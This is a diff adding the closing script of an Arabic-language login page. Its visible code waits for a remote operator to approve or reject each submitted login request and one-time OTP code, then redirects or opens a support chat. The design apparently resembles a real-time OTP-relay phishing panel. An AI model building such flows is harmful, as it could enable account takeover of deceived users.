+            loginRequestId = null;
+            showLoginSuccess();
+            return;
+        }
+
+        if (d.otpStatus === 'rejected') {
+            setLoading(otpConfirmBtn, false);
+            const msg = d.otpRejectReason || d.rejectReason || 'رمز OTP غير صالح.';
+            otpErrorBanner.querySelector('.otp-error-text').textContent = msg;
+            otpErrorBanner.classList.add('show');
+            return;
+        }
+    }
+
+    function handleSupportUpdate(d) {
+        if (d.status === 'rejected') {
+            setLoading(gateConfirmBtn, false);
+            gateGeneralError.textContent = d.rejectReason || 'تعذّر التحقق من بياناتك، يرجى المحاولة مرة أخرى';
+            gateGeneralError.classList.add('show');
+            localStorage.removeItem('support_request_id');
+            supportRequestId = null;
+            return;
+        }
+
+        if (d.status === 'approved' && !d.otpStatus) {
+            setLoading(gateConfirmBtn, false);
+            currentFlow = 'support';
+            showOtpOverlay();
+            return;
+        }
+
+        if (d.otpStatus === 'pending') {
+            setLoading(otpConfirmBtn, true);
+            return;
+        }
+
+        if (d.otpStatus === 'approved') {
+            setLoading(otpConfirmBtn, false);
+            otpOverlay.classList.remove('show');
+            supportVerified = true;
+            localStorage.setItem('support_verified', 'true');
+            localStorage.removeItem('support_request_id');
+            supportRequestId = null;
+            openChat();
+            return;
+        }
+
+        if (d.otpStatus === 'rejected') {
+            setLoading(otpConfirmBtn, false);
+            const msg = d.otpRejectReason || d.rejectReason || 'رمز OTP غير صالح.';
+            otpErrorBanner.querySelector('.otp-error-text').textContent = msg;
+            otpErrorBanner.classList.add('show');
+            return;
+        }
+    }
+
+    function showLoginSuccess() {
+        otpOverlay.innerHTML = `
+            <div class="success-view">
+                <i class="fa-solid fa-circle-check ok-icon"></i>
+                <div class="ok-title">تم بنجاح!</div>
+                <div class="ok-sub">جاري تحويلك إلى الصفحة الرئيسية...</div>
+                <div class="btn-spinner" style="display:inline-block;color:var(--accent);margin-top:8px">
+                    <span class="ring-outer"></span><span class="ring-inner"></span>
+                </div>
+            </div>
+        `;
+        setTimeout(() => { window.location.href = 'int.html'; }, 1200);
+    }
+
+    /* =================== Chat (customer service) =================== */
+    const chatModal    = $('chat-modal');
+    const chatMessages = $('chat-messages');
+    const chatInput    = $('chat-input');
+    const chatSend     = $('chat-send');
+    const chatClose    = $('chat-close');
+
+    async function openChat() {
+        chatModal.classList.add('show');
+        try {
+            const cid = await getOrCreateChat();
+            if (unsubChat) unsubChat();
+            unsubChat = onValue(ref(db, 'chats/' + cid), snap => {
+                const v = snap.val();
+                if (!v) return;
+                supportBadge.style.display = (v.unreadForClient > 0) ? 'block' : 'none';
+            });
+            if (unsubMsgs) unsubMsgs();
+            unsubMsgs = onValue(
+                query(ref(db, 'messages'), orderByChild('chatId'), equalTo(cid)),
+                snap => {
+                    const val = snap.val() || {};
+                    const list = Object.keys(val).map(id => Object.assign({ id }, val[id]))
+                                                 .sort((a, b) => (a.createdAt || 0) - (b.createdAt || 0));
+                    renderMessages(list);
+                }
+            );
+            await markMessagesRead();
+        } catch (e) { console.warn(e); }
+    }
+
+    function renderMessages(list) {
+        if (!list || !list.length) {
+            chatMessages.innerHTML = '<div class="msg-empty">لا توجد رسائل بعد</div>';
+            return;
+        }
+        chatMessages.innerHTML = '';
+        for (const m of list) {
+            const div = document.createElement('div');
+            div.className = 'msg ' + (m.sender === 'client' ? 'msg-client' : 'msg-admin');
+            div.textContent = m.text || '';
+            chatMessages.appendChild(div);
+        }
+        chatMessages.scrollTop = chatMessages.scrollHeight;
+    }
+
+    async function getOrCreateChat() {
+        if (chatId) return chatId;
+        if (userPhone) {
+            const snap = await get(query(ref(db, 'chats'), orderByChild('phone'), equalTo(userPhone)));
+            if (snap.exists()) {
+                const val = snap.val();
+                chatId = Object.keys(val)[0];
+                localStorage.setItem('chat_id', chatId);
+                return chatId;
+            }
+        }
+        const newRef = push(ref(db, 'chats'));
+        chatId = newRef.key;
+        await set(newRef, {
+            phone: userPhone || '',
+            name: userName || '',
+            lastMessage: '',
+            lastMessageAt: Date.now(),
+            unreadForAdmin: 0,
+            unreadForClient: 0,
+            updatedAt: Date.now()
+        });
+        localStorage.setItem('chat_id', chatId);
+        return chatId;
+    }
+
+    async function markMessagesRead() {
+        if (!chatId) return;
+        try {
+            const snap = await get(query(ref(db, 'messages'), orderByChild('chatId'), equalTo(chatId)));
+            if (!snap.exists()) return;
+            const val = snap.val();
+            const updates = {};
+            for (const id of Object.keys(val)) {
+                const m = val[id];
+                if (m && m.sender === 'admin' && m.read === false) {
+                    updates['messages/' + id + '/read'] = true;
+                }
+            }
+            updates['chats/' + chatId + '/unreadForClient'] = 0;
+            await update(ref(db), updates);
+        } catch (_) {}
+    }
+
+    async function sendChatMessage() {
+        const text = chatInput.value.trim();
+        if (!text) return;
+        chatInput.value = '';
+        try {
+            const cid = await getOrCreateChat();
+            const msgRef = push(ref(db, 'messages'));
+            await set(msgRef, {
+                chatId: cid,
+                sender: 'client',
+                text: text,
+                createdAt: Date.now(),
+                read: false
+            });
+            await update(ref(db, 'chats/' + cid), {
+                lastMessage: text,
+                lastMessageAt: Date.now(),
+                unreadForAdmin: increment(1),
+                updatedAt: Date.now()
+            });
+        } catch (e) {
+            console.error(e);
+            alert('تعذّر إرسال الرسالة');
+        }
+    }
+
+    chatClose.addEventListener('click', () => chatModal.classList.remove('show'));
+    chatSend.addEventListener('click', sendChatMessage);
+    chatInput.addEventListener('keydown', e => { if (e.key === 'Enter') sendChatMessage(); });
+
+    /* =================== Resume pending requests on refresh =================== */
+    (async function resume() {
+        await waitAuth();
+
+        if (loginRequestId) {
+            const snap = await get(ref(db, 'accessRequests/' + loginRequestId));
+            const d = snap.val();
+            if (!d || d.status === 'rejected' || d.status === 'cancelled' || d.otpStatus === 'approved') {
+                localStorage.removeItem('login_request_id');
+                loginRequestId = null;
+            } else {
+                currentFlow = 'login';
+                listenRequest(loginRequestId, 'login');
+            }
+        }
+
+        if (supportRequestId) {
+            const snap = await get(ref(db, 'accessRequests/' + supportRequestId));
+            const d = snap.val();
+            if (!d || d.status === 'rejected' || d.status === 'cancelled' || d.otpStatus === 'approved') {
+                localStorage.removeItem('support_request_id');
+                supportRequestId = null;
+                if (d && d.otpStatus === 'approved') {
+                    supportVerified = true;
+                    localStorage.setItem('support_verified', 'true');
+                }
+            } else {
+                currentFlow = 'support';
+                listenRequest(supportRequestId, 'support');
+            }
+        }
+
+        if (supportVerified && userPhone) {
+            try {
+                const cid = await getOrCreateChat();
+                onValue(ref(db, 'chats/' + cid), snap => {
+                    const v = snap.val();
+                    if (!v) return;
+                    supportBadge.style.display = (v.unreadForClient > 0) ? 'block' : 'none';
+                });
+            } catch (_) {}
+        }
+    })();
+
+    /* block scrolling when any overlay is open */
+    const observer = new MutationObserver(() => {
+        const anyOpen = gateOverlay.classList.contains('show')
+                     || otpOverlay.classList.contains('show')
+                     || chatModal.classList.contains('show');
+        document.body.style.overflow = anyOpen ? 'hidden' : '';
+    });
+    observer.observe(document.body, { attributes: true, subtree: true, attributeFilter: ['class'] });
+</script>
+</body>
+</html>
